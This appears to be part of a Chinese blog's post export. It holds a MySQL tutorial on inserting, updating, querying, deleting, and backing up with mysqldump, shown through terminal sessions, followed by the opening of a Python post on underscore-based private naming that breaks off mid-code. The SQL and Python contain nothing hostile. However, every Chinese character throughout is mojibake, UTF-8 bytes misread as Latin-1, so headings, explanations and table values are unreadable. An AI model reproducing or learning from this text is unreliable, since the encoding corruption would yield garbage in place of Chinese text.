| Pythonå…¥é—¨ç­          |+----+-----------------------+2 rows in set (0.00 sec)</code></pre><p>å‘å­¦ç”Ÿè¡¨ä¸­æ’å…¥å­¦ç”Ÿä¿¡æ¯.</p><p>ä¸»é”®å­—æ®µ å¯ä»¥ç”¨ <strong>0</strong>  <strong>null</strong>   <strong>default</strong> æ¥å ä½</p><p><strong>æšä¸¾æ•°æ®ç±»å‹</strong>ä¸­çš„ä¸‹æ ‡ä»1å¼€å§‹</p><blockquote><p>1â€”â€œç”·â€ </p></blockquote><blockquote><p>2â€”&gt;â€å¥³â€</p></blockquote><p>insert into students values(0,â€åˆ˜å¤‡â€,88,â€å¥³â€,1,â€1999-01-01â€);</p><pre><code>mysql&gt; show tables;+------------------+| Tables_in_School |+------------------+| class            || students         |+------------------+2 rows in set (0.00 sec)mysql&gt; desc students;+--------+-------------------------------------+------+-----+------------+----------------+| Field  | Type                                | Null | Key | Default    | Extra          |+--------+-------------------------------------+------+-----+------------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL       | auto_increment || name   | varchar(30)                         | YES  |     | NULL       |                || age    | tinyint(3) unsigned                 | YES  |     | 0          |                || gender | enum(&#39;ç”·&#39;,&#39;å¥³&#39;,&#39;ä¸­æ€§&#39;,&#39;ä¿å¯†&#39;)       | YES  |     | ä¿å¯†       |                || cls_id | int(10) unsigned                    | YES  |     | NULL       |                || birth  | date                                | YES  |     | 1990-01-01 |                |+--------+-------------------------------------+------+-----+------------+----------------+6 rows in set (0.01 sec)mysql&gt; insert into students values(0,&quot;åˆ˜å¤‡&quot;,88,&quot;å¥³&quot;,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.08 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 |+----+--------+------+--------+--------+------------+2 rows in set (0.00 sec)mysql&gt; insert into students values(null,&quot;åˆ˜å¤‡&quot;,88,&quot;å¥³&quot;,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.07 sec)mysql&gt; insert into students values(default,&quot;åˆ˜å¤‡&quot;,88,&quot;å¥³&quot;,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.07 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  3 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  4 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 |+----+--------+------+--------+--------+------------+4 rows in set (0.00 sec)mysql&gt; insert into students values(default,&quot;åˆ˜å¤‡&quot;,88,1,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.07 sec)mysql&gt; insert into students values(default,&quot;åˆ˜å¤‡&quot;,88,2,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.03 sec)mysql&gt; insert into students values(default,&quot;åˆ˜å¤‡&quot;,88,3,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.09 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  3 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  4 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  5 | åˆ˜å¤‡   |   88 | ç”·     |      1 | 1999-01-01 ||  6 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  7 | åˆ˜å¤‡   |   88 | ä¸­æ€§   |      1 | 1999-01-01 |+----+--------+------+--------+--------+------------+7 rows in set (0.01 sec)</code></pre><p><strong>éƒ¨åˆ†æ’å…¥</strong></p><p>insert into è¡¨å(åˆ—1,â€¦) values(å€¼1,â€¦);</p><p><strong>insert into students(name,gender) values(â€œè²‚è‰â€,2);</strong></p><pre><code>mysql&gt; desc students;+--------+-------------------------------------+------+-----+------------+----------------+| Field  | Type                                | Null | Key | Default    | Extra          |+--------+-------------------------------------+------+-----+------------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL       | auto_increment || name   | varchar(30)                         | YES  |     | NULL       |                || age    | tinyint(3) unsigned                 | YES  |     | 0          |                || gender | enum(&#39;ç”·&#39;,&#39;å¥³&#39;,&#39;ä¸­æ€§&#39;,&#39;ä¿å¯†&#39;)       | YES  |     | ä¿å¯†       |                || cls_id | int(10) unsigned                    | YES  |     | NULL       |                || birth  | date                                | YES  |     | 1990-01-01 |                |+--------+-------------------------------------+------+-----+------------+----------------+6 rows in set (0.00 sec)mysql&gt; insert into students(name,gender) values(&quot;è²‚è‰&quot;,2);Query OK, 1 row affected (0.02 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  3 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  4 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  5 | åˆ˜å¤‡   |   88 | ç”·     |      1 | 1999-01-01 ||  6 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  7 | åˆ˜å¤‡   |   88 | ä¸­æ€§   |      1 | 1999-01-01 ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 |+----+--------+------+--------+--------+------------+8 rows in set (0.00 sec)</code></pre><p><strong>å¤šè¡Œæ’å…¥</strong></p><p>insert into è¡¨å values(â€¦),(â€¦)â€¦;</p><p>insert into students <strong>values(default,â€è¥¿æ–½â€,20,2,1,â€1997-7-9â€),(default,â€å¤§ä¹”â€,21,2,1,â€1999-7-9â€)</strong>;</p><pre><code>mysql&gt; desc students;+--------+-------------------------------------+------+-----+------------+----------------+| Field  | Type                                | Null | Key | Default    | Extra          |+--------+-------------------------------------+------+-----+------------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL       | auto_increment || name   | varchar(30)                         | YES  |     | NULL       |                || age    | tinyint(3) unsigned                 | YES  |     | 0          |                || gender | enum(&#39;ç”·&#39;,&#39;å¥³&#39;,&#39;ä¸­æ€§&#39;,&#39;ä¿å¯†&#39;)       | YES  |     | ä¿å¯†       |                || cls_id | int(10) unsigned                    | YES  |     | NULL       |                || birth  | date                                | YES  |     | 1990-01-01 |                |+--------+-------------------------------------+------+-----+------------+----------------+6 rows in set (0.00 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  3 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  4 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  5 | åˆ˜å¤‡   |   88 | ç”·     |      1 | 1999-01-01 ||  6 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  7 | åˆ˜å¤‡   |   88 | ä¸­æ€§   |      1 | 1999-01-01 ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 |+----+--------+------+--------+--------+------------+8 rows in set (0.00 sec)mysql&gt; insert into students values(default,&quot;è¥¿æ–½&quot;,20,2,1,&quot;1997-7-9&quot;),(default,&quot;å¤§ä¹”&quot;,21,2,1,&quot;1999-7-9&quot;);Query OK, 2 rows affected (0.05 sec)Records: 2  Duplicates: 0  Warnings: 0mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  3 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  4 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  5 | åˆ˜å¤‡   |   88 | ç”·     |      1 | 1999-01-01 ||  6 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  7 | åˆ˜å¤‡   |   88 | ä¸­æ€§   |      1 | 1999-01-01 ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 ||  9 | è¥¿æ–½   |   20 | å¥³     |      1 | 1997-07-09 || 10 | å¤§ä¹”   |   21 | å¥³     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+10 rows in set (0.00 sec)</code></pre><h2 id="ä¿®æ”¹"><a href="#ä¿®æ”¹" class="headerlink" title="ä¿®æ”¹"></a>ä¿®æ”¹</h2><p>è¯­æ³•:</p><blockquote><p>update è¡¨å set åˆ—1=å€¼1,åˆ—2=å€¼2â€¦ where æ¡ä»¶</p></blockquote><p>update students set gender=1 where id = 2;</p><p>update students set name = â€œå¼ ä¸‰â€,age = 100 where id = 2;</p><pre><code>+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  3 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  4 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  5 | åˆ˜å¤‡   |   88 | ç”·     |      1 | 1999-01-01 ||  6 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  7 | åˆ˜å¤‡   |   88 | ä¸­æ€§   |      1 | 1999-01-01 ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 ||  9 | è¥¿æ–½   |   20 | å¥³     |      1 | 1997-07-09 || 10 | å¤§ä¹”   |   21 | å¥³     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+mysql&gt; update students set gender=1 where id = 2;Query OK, 1 row affected (0.14 sec)Rows matched: 1  Changed: 1  Warnings: 0mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | åˆ˜å¤‡   |   88 | ç”·     |      1 | 1999-01-01 ||  3 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  4 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  5 | åˆ˜å¤‡   |   88 | ç”·     |      1 | 1999-01-01 ||  6 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  7 | åˆ˜å¤‡   |   88 | ä¸­æ€§   |      1 | 1999-01-01 ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 ||  9 | è¥¿æ–½   |   20 | å¥³     |      1 | 1997-07-09 || 10 | å¤§ä¹”   |   21 | å¥³     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+10 rows in set (0.00 sec)mysql&gt; update students set name = &quot;å¼ ä¸‰&quot;,age = 100 where id = 2;Query OK, 1 row affected (0.01 sec)Rows matched: 1  Changed: 1  Warnings: 0mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | å¼ ä¸‰   |  100 | ç”·     |      1 | 1999-01-01 ||  3 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  4 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  5 | åˆ˜å¤‡   |   88 | ç”·     |      1 | 1999-01-01 ||  6 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  7 | åˆ˜å¤‡   |   88 | ä¸­æ€§   |      1 | 1999-01-01 ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 ||  9 | è¥¿æ–½   |   20 | å¥³     |      1 | 1997-07-09 || 10 | å¤§ä¹”   |   21 | å¥³     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+10 rows in set (0.01 sec)</code></pre><h2 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h2><p><strong>æŸ¥è¯¢æ‰€æœ‰åˆ—</strong></p><p>select * from è¡¨å;</p><p>select * from students;</p><p><strong>æ¡ä»¶æŸ¥è¯¢</strong></p><p>select * from students where name = â€œåˆ˜å¤‡â€;</p><p><strong>æŸ¥è¯¢æŒ‡å®šåˆ—</strong></p><p>select åˆ—1,åˆ—2,â€¦ from è¡¨å;</p><p>select name,gender from students;</p><p><strong>ä¸ºåˆ—æˆ–è¡¨æŒ‡å®šåˆ«å</strong></p><p>select name as â€œå§“åâ€,gender as â€œæ€§åˆ«â€ from students;</p><p><strong>ä¾ç…§å­—æ®µçš„é¡ºåºè¿›è¡ŒæŸ¥è¯¢</strong></p><p>select id as â€œåºå·â€,gender as â€œæ€§åˆ«â€,name as â€œå§“åâ€,birth as â€œç”Ÿæ—¥â€ from students;</p><pre><code>mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | å¼ ä¸‰   |  100 | ç”·     |      1 | 1999-01-01 ||  3 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  4 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  5 | åˆ˜å¤‡   |   88 | ç”·     |      1 | 1999-01-01 ||  6 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  7 | åˆ˜å¤‡   |   88 | ä¸­æ€§   |      1 | 1999-01-01 ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 ||  9 | è¥¿æ–½   |   20 | å¥³     |      1 | 1997-07-09 || 10 | å¤§ä¹”   |   21 | å¥³     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+10 rows in set (0.01 sec)mysql&gt; select * from students where name = &quot;åˆ˜å¤‡&quot;;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  3 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  4 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  5 | åˆ˜å¤‡   |   88 | ç”·     |      1 | 1999-01-01 ||  6 | åˆ˜å¤‡   |   88 | å¥³     |      1 | 1999-01-01 ||  7 | åˆ˜å¤‡   |   88 | ä¸­æ€§   |      1 | 1999-01-01 |+----+--------+------+--------+--------+------------+5 rows in set (0.00 sec)mysql&gt; select name,gender from students;+--------+--------+| name   | gender |+--------+--------+| æ›¹æ“   | å¥³     || å¼ ä¸‰   | ç”·     || åˆ˜å¤‡   | å¥³     || åˆ˜å¤‡   | å¥³     || åˆ˜å¤‡   | ç”·     || åˆ˜å¤‡   | å¥³     || åˆ˜å¤‡   | ä¸­æ€§   || è²‚è‰   | å¥³     || è¥¿æ–½   | å¥³     || å¤§ä¹”   | å¥³     |+--------+--------+10 rows in set (0.00 sec)mysql&gt; select name as &quot;å§“å&quot;,gender as &quot;æ€§åˆ«&quot; from students;+--------+--------+| å§“å   | æ€§åˆ«   |+--------+--------+| æ›¹æ“   | å¥³     || å¼ ä¸‰   | ç”·     || åˆ˜å¤‡   | å¥³     || åˆ˜å¤‡   | å¥³     || åˆ˜å¤‡   | ç”·     || åˆ˜å¤‡   | å¥³     || åˆ˜å¤‡   | ä¸­æ€§   || è²‚è‰   | å¥³     || è¥¿æ–½   | å¥³     || å¤§ä¹”   | å¥³     |+--------+--------+10 rows in set (0.00 sec)mysql&gt; select id as &quot;åºå·&quot;,gender as &quot;æ€§åˆ«&quot;,name as &quot;å§“å&quot;,birth as &quot;ç”Ÿæ—¥&quot; from students;+--------+--------+--------+------------+| åºå·   | æ€§åˆ«   | å§“å   | ç”Ÿæ—¥       |+--------+--------+--------+------------+|      1 | å¥³     | æ›¹æ“   | NULL       ||      2 | ç”·     | å¼ ä¸‰   | 1999-01-01 ||      3 | å¥³     | åˆ˜å¤‡   | 1999-01-01 ||      4 | å¥³     | åˆ˜å¤‡   | 1999-01-01 ||      5 | ç”·     | åˆ˜å¤‡   | 1999-01-01 ||      6 | å¥³     | åˆ˜å¤‡   | 1999-01-01 ||      7 | ä¸­æ€§   | åˆ˜å¤‡   | 1999-01-01 ||      8 | å¥³     | è²‚è‰   | 1990-01-01 ||      9 | å¥³     | è¥¿æ–½   | 1997-07-09 ||     10 | å¥³     | å¤§ä¹”   | 1999-07-09 |+--------+--------+--------+------------+10 rows in set (0.00 sec)</code></pre><h2 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h2><p><strong>ç‰©ç†åˆ é™¤</strong></p><p>delete from è¡¨å where æ¡ä»¶</p><p>delete from students;        </p><blockquote><p>æ¸…ç©ºæ•°æ®è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®</p></blockquote><p>delete from students where name = â€œåˆ˜å¤‡â€;</p><blockquote><p>æ ¹æ®æ¡ä»¶åˆ é™¤</p></blockquote><pre><code>mysql&gt; delete from students where name = &quot;åˆ˜å¤‡&quot;;Query OK, 5 rows affected (0.13 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       ||  2 | å¼ ä¸‰   |  100 | ç”·     |      1 | 1999-01-01 ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 ||  9 | è¥¿æ–½   |   20 | å¥³     |      1 | 1997-07-09 || 10 | å¤§ä¹”   |   21 | å¥³     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+5 rows in set (0.00 sec)</code></pre><p><strong>é€»è¾‘åˆ é™¤</strong></p><p>ç”¨ä¸€ä¸ªå­—æ®µè¡¨ç¤ºè¿™æ¡æ•°æ®å·²ç»è¢«åˆ é™¤</p><p>ç»™æ•°æ®è¡¨(students)æ·»åŠ ä¸€ä¸ªå­—æ®µis_deleteæ•°æ®ç±»å‹ä¸ºbitç±»å‹,1ä¸ºåˆ é™¤,0ä¸ºæœªåˆ é™¤</p><p>alter table students add is_delete bit default 0;</p><p>update students set is_delete = 1 where id = 1;</p><pre><code>mysql&gt; alter table students add is_delete bit default 0;Query OK, 0 rows affected (0.10 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; select * from students;+----+--------+------+--------+--------+------------+-----------+| id | name   | age  | gender | cls_id | birth      | is_delete |+----+--------+------+--------+--------+------------+-----------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       |           ||  2 | å¼ ä¸‰   |  100 | ç”·     |      1 | 1999-01-01 |           ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 |           ||  9 | è¥¿æ–½   |   20 | å¥³     |      1 | 1997-07-09 |           || 10 | å¤§ä¹”   |   21 | å¥³     |      1 | 1999-07-09 |           |+----+--------+------+--------+--------+------------+-----------+5 rows in set (0.00 sec)mysql&gt; update students set is_delete = 1 where id = 1;Query OK, 1 row affected (0.09 sec)Rows matched: 1  Changed: 1  Warnings: 0mysql&gt; select * from students;+----+--------+------+--------+--------+------------+-----------+| id | name   | age  | gender | cls_id | birth      | is_delete |+----+--------+------+--------+--------+------------+-----------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       | â˜º         ||  2 | å¼ ä¸‰   |  100 | ç”·     |      1 | 1999-01-01 |           ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 |           ||  9 | è¥¿æ–½   |   20 | å¥³     |      1 | 1997-07-09 |           || 10 | å¤§ä¹”   |   21 | å¥³     |      1 | 1999-07-09 |           |+----+--------+------+--------+--------+------------+-----------+5 rows in set (0.00 sec)</code></pre><h1 id="Mysqlæ•°æ®åº“çš„å¤‡ä»½"><a href="#Mysqlæ•°æ®åº“çš„å¤‡ä»½" class="headerlink" title="Mysqlæ•°æ®åº“çš„å¤‡ä»½"></a>Mysqlæ•°æ®åº“çš„å¤‡ä»½</h1><h2 id="å¤‡ä»½æ•°æ®åº“"><a href="#å¤‡ä»½æ•°æ®åº“" class="headerlink" title="å¤‡ä»½æ•°æ®åº“"></a>å¤‡ä»½æ•°æ®åº“</h2><p>mysqldump -u root æ•°æ®åº“å &gt; test.sql;</p><pre><code>[chen@bogon ~]$ mysqldump -u root -p  School &gt; test.sql;Enter password:[chen@bogon ~]$ lstest.sql  å…¬  æ¨¡  è§†  å›¾  æ–‡  ä¸‹  éŸ³  æ¡Œ[chen@bogon ~]$ mysql -u root -pEnter password:Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 19Server version: 8.0.13 MySQL Community Server - GPLCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database           |+--------------------+| School             || information_schema || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)mysql&gt; drop database School;Query OK, 2 rows affected (0.14 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.00 sec)mysql&gt; exitBye</code></pre><h2 id="æ¢å¤å¤‡ä»½"><a href="#æ¢å¤å¤‡ä»½" class="headerlink" title="æ¢å¤å¤‡ä»½"></a>æ¢å¤å¤‡ä»½</h2><ol><li>è¿æ¥mysqlï¼Œåˆ›å»ºæ–°çš„æ•°æ®åº“</li><li>é€€å‡ºè¿æ¥æ‰§è¡Œä¸‹åˆ—å‘½ä»¤</li></ol><p>mysql -u root -p æ–°æ•°æ®åº“åå­—(åˆšåˆšåˆ›å»ºçš„) &lt; test.sql</p><pre><code>[chen@bogon ~]$ mysql -u root -pEnter password:Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 20Server version: 8.0.13 MySQL Community Server - GPLCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.mysql&gt; create database School;Query OK, 1 row affected (0.66 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| School             || information_schema || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)mysql&gt; exitBye[chen@bogon ~]$ mysql -u root -p School &lt; test.sqlEnter password:[chen@bogon ~]$ mysql -u root -pEnter password:Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 22Server version: 8.0.13 MySQL Community Server - GPLCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.mysql&gt; use School;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_School |+------------------+| class            || students         |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+-----------+| id | name   | age  | gender | cls_id | birth      | is_delete |+----+--------+------+--------+--------+------------+-----------+|  1 | æ›¹æ“   |   18 | å¥³     |      0 | NULL       | â˜º         ||  2 | å¼ ä¸‰   |  100 | ç”·     |      1 | 1999-01-01 |           ||  8 | è²‚è‰   |    0 | å¥³     |   NULL | 1990-01-01 |           ||  9 | è¥¿æ–½   |   20 | å¥³     |      1 | 1997-07-09 |           || 10 | å¤§ä¹”   |   21 | å¥³     |      1 | 1999-07-09 |           |+----+--------+------+--------+--------+------------+-----------+5 rows in set (0.00 sec)</code></pre><h1 id="ç‰¹åˆ«æé†’"><a href="#ç‰¹åˆ«æé†’" class="headerlink" title="ç‰¹åˆ«æé†’"></a>ç‰¹åˆ«æé†’</h1><p><strong>MysqlSQLä¸­çš„æ³¨é‡Šä½¿ç”¨åŒæ¨ªçº¿  - -  </strong></p><p><strong>mysqlå‘½ä»¤è¡Œä¸åŒºåˆ†å¤§å°å†™,ä½†æ˜¯è¯­æ³•ä¸€èˆ¬éƒ½è¦å¤§å†™.</strong></p><p><strong>å¿˜è®°Deleteå’ŒDropå‘½ä»¤å§,æ•°æ®ä¸€åˆ ,ç‰¢åº•åç©¿</strong></p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pythonç§æœ‰åŒ–</title>
      <link href="/2018/11/18/python-si-you-hua/"/>
      <url>/2018/11/18/python-si-you-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h1><ul><li>variable: å…¬æœ‰å˜é‡</li><li>_variable: å•å‰ç½®ä¸‹åˆ’çº¿,ç§æœ‰åŒ–å±æ€§æˆ–æ–¹æ³•ï¼Œfrom somemodule import *ç¦æ­¢å¯¼å…¥,ç±»å¯¹è±¡å’Œå­ç±»å¯ä»¥è®¿é—®</li><li>__variableï¼šåŒå‰ç½®ä¸‹åˆ’çº¿,é¿å…ä¸å­ç±»ä¸­çš„å±æ€§å‘½åå†²çªï¼Œæ— æ³•åœ¨å¤–éƒ¨ç›´æ¥è®¿é—®(åå­—é‡æ•´æ‰€ä»¥è®¿é—®ä¸åˆ°)</li><li><strong>variable</strong>:åŒå‰åä¸‹åˆ’çº¿,ç”¨æˆ·<strong>åå­—ç©ºé—´çš„é­”æ³•å¯¹è±¡æˆ–å±æ€§</strong>ã€‚ä¾‹å¦‚:<strong>init</strong> , __ <strong>ä¸è¦è‡ªå·±å‘æ˜è¿™æ ·çš„åå­—</strong></li><li>xx_:å•åç½®ä¸‹åˆ’çº¿,<strong>ç”¨äºé¿å…ä¸Pythonå…³é”®è¯çš„å†²çª</strong></li></ul><h1 id="å®ä¾‹å¼•å…¥"><a href="#å®ä¾‹å¼•å…¥" class="headerlink" title="å®ä¾‹å¼•å…¥"></a>å®ä¾‹å¼•å…¥</h1><pre><code>__author__ = &#39;Chen&#39;__date__ = &#39;2018/11/13 22:37&#39;class Person(object):    def __init__(self, name, age, teste):        self.name = name  # å…¬æœ‰å˜é‡        self._age = age  # ç§æœ‰å˜é‡ï¼Œå‡½æ•°ï¼Œæ–¹æ³•å’Œç±»,from somemodule import * ç¦æ­¢å¯¼å…¥,ç±»å¯¹è±¡å’Œå­ç±»å¯ä»¥è®¿é—®        self.__teste = teste  # é¿å…ä¸å­ç±»ä¸­çš„å±æ€§å‘½åå†²çª,æ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®    def showPeron(self):        print(self.name)        print(self._age)        print(self.__teste)    def _work(self):        # ç§æœ‰æ–¹æ³•        print(&quot;ç§æœ‰æ–¹æ³•&quot;)    def __away(self):        # é¿å…ä¸å­ç±»ä¸­çš„æ–¹æ³•å‘½åå†²çª,æ— æ³•åœ¨å¤–éƒ¨è®¿é—®        print(&quot;away&quot;)    def doWork(self):        self._work()        self.__away()class Student(Person):    # ç»§æ‰¿Peron    def construction(self, name, age, teste):        # æ„é€ æ–¹æ³•        self.name = name        self._age = age        self.__teste = teste    def showStudent(self):        print(self.name)        print(self._age)        print(self.__teste)    @staticmethod  # é™æ€æ–¹æ³•æ— æƒè®¿é—®clsæˆ–selfã€‚å®ƒä»¬åƒå¸¸è§„å‡½æ•°ä¸€æ ·å·¥ä½œï¼Œä½†å±äºç±»çš„å‘½åç©ºé—´ã€‚    def testbug():        _Bug.showbug()class _Bug(object):    @staticmethod    def showbug():        print(&quot;showBug&quot;)if __name__ == &#39;__main__&#39;:    s1 = Student(&quot;Chen&quot;, 25, &quot;Like&quot;)  # å®ä¾‹åŒ–å¯¹è±¡    s1.showPeron()  # è°ƒç”¨æ–¹æ³•    # s1.showStudent()    # __teste:åŒé‡å‰å¯¼ä¸‹åˆ’çº¿åº”è¯¥ä»…ç”¨äºé¿å…ä¸è®¾è®¡ä¸ºå­ç±»çš„ç±»ä¸­çš„å±æ€§å‘ç”Ÿåç§°å†²çªã€‚    s1.construction(&quot;æ›¹æ“&quot;, 88, &quot;Test&quot;)    s1.showStudent()    Student.testbug()  # 